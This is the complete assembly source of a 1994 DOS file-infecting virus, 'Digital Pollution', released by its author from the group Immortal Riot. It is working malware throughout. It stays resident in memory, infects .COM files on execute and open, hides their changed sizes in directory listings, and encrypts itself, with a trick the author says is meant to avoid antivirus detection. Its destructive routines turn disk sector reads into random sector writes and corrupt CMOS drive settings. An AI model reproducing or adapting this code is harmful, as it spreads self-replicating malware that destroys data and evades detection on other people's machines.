; VirusName : Digital Pollution
; Origin    : Sweden
; Author    : Raver
; Group     : Immortal Riot
; Date      : 25/07/94

; It's been a while since I released my last virus but here's a new one
; anyway.
;
; It's a pretty simple resident non-overwriting .com-infector with
; basic stealth function. Of course it restores time/date/attrib
; and stuff like that. It hooks int 21h and infects on execute
; and open (4b00h/3dh). If a "dir" command is executed it will hide
; the new filesize of infected size by hooking 11h/12h (Find first/next
; the FCB way). The comments is, I think, pretty OK and easy to follow.
;
; As we have started to make out viruses a bit more destructive I've
; included some nuking routines. The virus hooks int 25h (read sector)
; at install and every time it's called there is a 3 % chance that it
; will execute a int 26h instead (write sector). It also includes a
; routine to change the CMOS values for the HD/floppy. Every time an
; infected file is executed it's 2 % chance that this will be activated
; and if so the HD will be set to 20MB and the floppy to 360kb.
; Though this can easily be restored it can cause the novice to do
; some unpredictable things before he really detects the real error.
; (like formating floppys or HD or call his hardware vendor :)
; Also if it's the swedish national day (06/06) it will play some of
; the swedish national antheme. It's completely undestructive but
; what the phuck, it could be fun.

; At last some credits to Macaroni Ted 'cause I've borrowed the
; play_song routine from his CyberCide Virus.


; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;                          DIGITAL POLLUTION
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

cseg	segment byte public 'code'
        assume cs:cseg, ds:cseg

	org 100h

vir_size equ end_of_virus-start_of_virus

start_of_virus:
    jmp entry_point

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;                        Install code
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
install:

    mov ax,7777h		    ;check if we're already in mem
    int 21h
    cmp ax,'iR'			    ;if so - jmp already_resident
    je already_resident

    mov ah,2ah			    ;get data
    int 21h
    cmp dx,0606h		    ;if it's Sweden's national day
    jne dont_play		    ;play the national antheme
    call play_song
dont_play:

    mov ah,4ah			    ;get #of available paragraphs in bx
    mov bx,0ffffh
    int 21h

    sub bx,(vir_size+15)/16+1	    ;recalculate and 
    mov ah,4ah
    int 21h

    mov ah,48h          	    ;allocate enough mem for virus
    mov bx,(vir_size+15)/16
    int 21h
    jc already_resident		    ;exit if error

    dec ax			    ;ax-1 = MCB
    mov es,ax
    mov word ptr es:[1],8	    ;Mark DOS as owner

    push ax			    ;save for later use

    mov ax,3521h		    ;get interrupt vectors for 21, 25 & 26h
    int 21h
    mov word ptr ds:[OldInt21h],bx
    mov word ptr ds:[OldInt21h+2],es

    mov al,25h
    int 21h
    mov word ptr ds:[old_int25h],bx
    mov word ptr ds:[old_int25h+2],es

    inc al
    int 26h
    mov word ptr ds:[int26h],bx
    mov word ptr ds:[int26h+2],es

    pop ax			    ;ax = MCB for allocated mem
    push cs
    pop ds

    cld				    ;cld for movsw
    sub ax,0fh			    ;es:[100h] = start of allocated mem
    mov es,ax
    mov di,100h
    lea si,[bp+offset start_of_virus]
    mov cx,(vir_size+1)/2	    ;copy entire virii to mem
    rep movsw			    ;this way keeps the original offsets
				    ;in the int handler
    push es
    pop ds

    mov dx,offset new_int21h	    ;hook int21h to new_int21h
    mov ax,2521h
    int 21h

already_resident:
    mov di,100h			    ;restore the 3 first bytes to it's
    push cs			    ;original position
    push cs
    pop es
    pop ds
    lea si,[bp+orgbuf]
    mov cx,3
    rep movsb

    mov ah,2ch			    ;get time
    int 21h
    cmp dl,1			    ;about 2% chance of a CMOS nuke
    ja exit
    call screw_cmos
exit:
    mov ax,100h			    ;return control to original program
    jmp ax			    ;at cs:100h

orgbuf db 0cdh,20h,90h		    ;buffer to save the 3 first bytes
newbuf db 0e9h,00h,00h		    ;buffer to calculate a new entry
				    ;offset

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;                    new interrupt 21h handler
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
new_int21h:

    cmp ax,7777h		    ;is it residency check??
    jne continue
    mov ax,'iR'			    ;if so return 'iR'
    iret
continue:
    cmp ax,4b00h		    ;check for exec
    je infect
check_open:
    cmp ah,3dh			    ;check for open
    jne check_dir
    jmp check_com		    ;if si check if .com file
check_dir:
    cmp ah,11h			    ;is it a dir call??
    je hide_dir			    ;then do some FCB stealth
    cmp ah,12h
    je hide_dir
    jmp do_oldint21h

hide_dir:			    ;FCB stealth routine
    pushf			    ;simulate a int call with pushf
    push cs			    ;and cs, ip on the stack
    call do_oldint21h
    or al,al			    ;was the dir call successfull??
    jnz skip_dir		    ;if not skip it

    push ax bx es		    ;preserve registers in use

    mov ah,62h			    ;same as 51h - Get current PSP to es:bx
    int 21h
    mov es,bx
    cmp bx,es:[16h]		    ;is the PSP OK??
    jnz bad_psp			    ;if not quit

    mov bx,dx
    mov al,[bx]			    ;al holds current drive - FFh means
    push ax			    ;extended FCB
    mov ah,2fh			    ;get DTA-area
    int 21h
    pop ax
    inc al			    ;is it an extended FCB
    jnz no_ext
    add bx,7			    ;if so add 7
no_ext:
    mov al,byte ptr es:[bx+17h]	    ;get seconds field
    and al,1fh
    xor al,1dh			    ;is the file infected??
    jnz no_stealth		    ;if not - don't hide size

    cmp word ptr es:[bx+1dh],vir_size-3	    ;if a file with same seconds
    jbe no_stealth			    ;as an infected is smaller -
    sub word ptr es:[bx+1dh],vir_size-3	    ;don't hide size
    sbb word ptr es:[bx+1fh],0		    ;else sub vir_size-2 from 
no_stealth:				    ;dir entry
bad_psp:
    pop es bx ax		    ;restore regs
skip_dir:
    iret


infect:				    ;.com file infection routine
    push es bp ax bx cx si di ds dx ;preserve registers in use

    mov ax,4300h		    ;get attrib
    int 21h
    push cx			    ;save attrib
    mov ax,4301h		    ;clear attrib
    xor cx,cx
    int 21h

    mov ax,3d02h		    ;open file
    pushf			    ;we can't have a standard int 21h
    push cs			    ;call here as we would get caught
    call do_oldint21h		    ;in a infinite loop at open calls

    xchg ax,bx			    ;bx = file handle

    push cs
    pop ds

    mov ax,5700h		    ;get time/date
    int 21h
    push dx			    ;push date/time for later use
    push cx
    and cl,1fh			    ;check if infected (if seconds is 29)
    xor cl,1dh
    je skip_infect

    mov ah,3fh			    ;read three bytes
    mov cx,3
    mov dx,offset ds:orgbuf
    int 21h


    cmp word ptr ds:orgbuf,'ZM'	    ;check if .EXE file
    je skip_infect
    cmp word ptr ds:orgbuf,'MZ'
    je skip_infect		    ;if so - don't infect


    mov ax,4202h		    ;go eof
    xor cx,cx
    cwd
    int 21h

    add ax,offset entry_point-106h  ;calculate entry offset to jmp
    mov word ptr ds:newbuf[1],ax    ;move it to newbuf

    mov ah,2ch			    ;get random number and put enc_val
    int 21h
    mov word ptr ds:enc_val,dx
    mov ax,08d00h		    ;copy entire virus to 8d00h:100h
    mov es,ax
    mov di,100h
    mov si,di
    mov cx,(vir_size+1)/2
    rep movsw
    push es
    pop ds
    xor bp,bp			    ;and encrypt it there
    call encrypt_decrypt



    mov ah,40h			    ;write virus to file from position
    mov cx,end_of_virus-install	    ;08d00h:100h
    mov dx,offset install
    int 21h

    push cs
    pop ds

    mov ax,4200h		    ;go sof
    xor cx,cx
    cwd
    int 21h

    mov ah,40h			    ;write 3 start bytes
    mov cx,3
    mov dx,offset newbuf
    int 21h

skip_infect:
    mov ax,5701h		    ;restore time/date and mark it infected
    pop cx
    pop dx
    or cl,00011101b
    and cl,11111101b
    int 21h

;skip_infect:
    mov ah,3eh			    ;close the file
    int 21h

    pop cx			    ;get old attrib in cx
    pop dx
    pop ds
    mov ax,4301h		    ;and put it right
    int 21h

    pop di si cx bx ax bp es	    ;restore registers

do_oldint21h:
db 0eah				    ;jmp to original int21h handler
OldInt21h dd 0

check_com:			    ;routine to check if a file has the
    push di es cx ax		    ;extension .com
    push ds
    pop es
    mov cx,64
    mov di,dx
    mov al,'.'
    repne scasb			    ;search for the '.' location

    pop ax cx es

    cmp word ptr ds:[di],'OC'	    ;check the 3 following bytes for COM
    jne break
    cmp byte ptr ds:[di+2],'M'
    jne break
    pop di
    jmp infect			    ;if the match - infect the file
break:
    pop di
    jmp short do_oldint21h


; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;                    new interrupt 25h handler
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
new_int25h:

    push dx
    cmp al,2			    ;check for c: and above
    jb do_int25h
    push cx ax

    mov ah,2ch			    ;get random number
    int 21h
    pop ax cx
    cmp dl,2			    ;3% chance of a int 26 nuke
    ja do_int25h

trash:
    pop dx 
db 0eah			    ;trash cx # of sectors by jumping
int26h dd 0			    ;to int26h handler

do_int25h:
    pop dx
db 0eah				    ;lucky victim - a standard int25h call
old_int25h dd 0


; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;                        CMOS nuking routine
;
; This routine changes the floppy alternative in CMOS to a 360kb floppy
; or the hd to a 20 MB
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
screw_cmos:

    or dl,dl			    ;if dl = 0 nuke CMOS floppy
    jne floppy
    mov cl,19h			    ;else nuke CMOS hd
    jmp short get_crc
floppy:
    mov cl,10h

get_crc:			    ;get CMOS crc checksum
    mov ax,2eh			    ;get most significant byte
    out 70h,al			    ;and store in dh
    in al,71h
    xchg dh,al
    mov al,2fh			    ;get least significant byte
    out 70h,al			    ;and store in dl
    in al,71h
    xchg dl,al			    ;dx holds crc checksum

    mov al,cl			    ;cl = function (10h=floopy, 19h=hd)
    out 70h,al
    in al,71h			    ;get current value in al
    sub dx,ax			    ;and subtract from checksum
    add dx,10h			    ;add new value to checksum

    mov al,cl
    out 70h,al
    mov al,10h
    out 71h,al			    ;put new value in CMOS

    mov al,2eh			    ;put back new crc checksum
    out 70h,al
    xchg dh,al
    out 71h,al			    ;least signigicant byte
    mov al,2fh
    out 70h,al
    xchg dl,al
    out 71h,al			    ;most significant byte

    ret				    ;done!


; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;                 Swedish national anthem routine
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
play_song:

    lea si,[bp+tune]
next_note:			    ;loop through the tune at ds:si
    lodsw			    ;until ds:si = 0
    or ax,ax
    je eot        
    mov di,ax
play:
    mov al,0b6h
    out 43h,al
    mov dx,12h
    mov ax,3280h
    div di
    out 42h,al
    mov al,ah
    out 42h,al

    in al,61h
    mov ah,al
    or al,3
    out 61h,al
    
    lodsw
    mov cx,ax
delay:
    push cx
    mov cx,2700
    loop $
    pop cx
    loop delay
    
    out 61h,al
    
    jmp next_note
eot:
    xor al,al			    ;kill the sound
    out 61h,al

    ret

tune dw 370,600			    ;data for the tune
     dw 370,1200
     dw 294,600
     dw 294,600
     dw 294,1200
     dw 330,600
     dw 370,600
     dw 370,1200
     dw 330,600
     dw 294,600
     dw 277,1800
     dw 330,600
     dw 330,1200
     dw 277,600
     dw 294,600
     dw 330,600
     dw 277,600
     dw 370,600
     dw 294,600
     dw 247,2400
     dw 220,1200
     dw 0

dbnote db "Digital Pollution (c) '94 Raver/Immortal Riot"   ;creators note


; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;      En/de-cryption routine and entry point - unencrypted code
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
encrypt_decrypt:
    mov ax,word ptr ds:[bp+enc_val]	    ;put encryption value in ax
    lea di,[bp+install]			    ;di points to start of crypt
    mov cx,(encrypt_decrypt-install)/2	    ;cx = # of words to be enc.
xor_loopy:
    xor word ptr ds:[di],ax		    ;a simple xor loop to fullfill
    inc di				    ;the task
    inc di
    loop xor_loopy
    ret
enc_val dw 0


entry_point:
    mov sp,102h				    ;some alternative way to pop
    call get_bp				    ;we don't want TBAV to flag
get_bp:					    ;a flexible entry point
    mov bp,word ptr ds:[100h]
    mov sp,0fffeh
    sub bp,offset get_bp

    call encrypt_decrypt		    ;decrypt the virus
    jmp install				    ;jmp to install code

end_of_virus:

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;                           end of virus
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
cseg	ends

	end start_of_virus